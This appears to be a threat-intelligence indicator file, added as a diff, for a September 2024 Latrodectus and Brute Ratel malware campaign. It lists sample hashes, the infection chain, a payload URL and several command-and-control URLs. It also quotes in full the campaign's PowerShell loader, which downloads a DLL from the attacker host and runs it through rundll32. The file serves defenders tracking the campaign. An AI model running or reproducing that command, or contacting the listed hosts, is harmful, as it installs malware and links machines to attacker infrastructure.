@@ -1,0 +1,36 @@
+20.09.2024 | Latrodectus | Brute Ratel | Version 1.8 | CampaignID: Alpha
+
+*************************************************
+
+.html 0a42503e19d36070db3b03249cad33c73ee941b7af32170f25234ac5f3a30823
+.url http://gertioma.top/o.jpg
+.dll 6ab1bee44804b0821933c7b20bbdc92deb6a21fd587a51d43761ba1500c2149d
+
+*************************************************
+
+.html > ps > .url > .dll
+
+cmd /c start /min powershell $path='%appdata%\witwin_st_x64.dll';iwr http://gertioma.top/o.jpg -outfile $path; start-process rundll32 $path,NxReleasePMap;
+
+*************************************************
+
+.dll distro
+
+http://gertioma.top/o.jpg
+
+*************************************************
+
+c2's
+
+BRC4
+
+https://bazarunet.com:8041/bazar.php
+https://greshunka.com:8041/admin.php
+https://tiguanin.com:8041/bazar.php
+
+Latrodectus
+
+https://rilomenifis.com/test/
+https://isomicrotich.com/test/
+
+*************************************************
